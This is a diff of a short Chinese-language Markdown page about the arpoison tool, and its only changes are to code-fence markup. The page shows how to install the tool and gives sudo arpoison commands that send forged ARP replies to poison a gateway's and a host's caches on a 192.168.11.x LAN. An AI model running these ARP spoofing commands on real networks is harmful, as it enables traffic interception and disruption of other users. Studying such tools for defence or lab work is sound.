@@ -1,6 +1,6 @@
 ### 安裝 {#installing}
 
-```console
+```
 shell> brew install arpoison
 ```
 
@@ -23,20 +23,20 @@ Usage: -i <device> -d <dest IP> -s <src IP> -t <target MAC> -r <src MAC> [-a] [-
 `gateway` `192.168.11.1` `78:44:76:f8:ec:38`
 `macgen` `00:16:3e:20:b0:11`
 
-```console
+```
 shell> sudo arpoison -i en0 -d 192.168.11.2 -s 192.168.11.1 -t fc:aa:14:b4:4c:18 -r 00:16:3e:20:b0:11
 shell> sudo arpoison -i en0 -d 192.168.11.2 -s 192.168.11.1 -t ff:ff:ff:ff:ff:ff -r 00:16:3e:20:b0:11
 ```
 
 ---
 
-```console
+```
 shell> sudo arpoison -i en0 -d 192.168.11.1 -s 192.168.11.2 -t ff:ff:ff:ff:ff:ff -r fc:aa:14:b4:4c:18
 shell> sudo arpoison -i en0 -d 192.168.11.1 -s 192.168.11.2 -t 78:44:76:f8:ec:38 -r fc:aa:14:b4:4c:18
 ```
 
 
-```console
+```
 shell> ./macgen.py 
 00:16:3e:20:b0:11
 ```
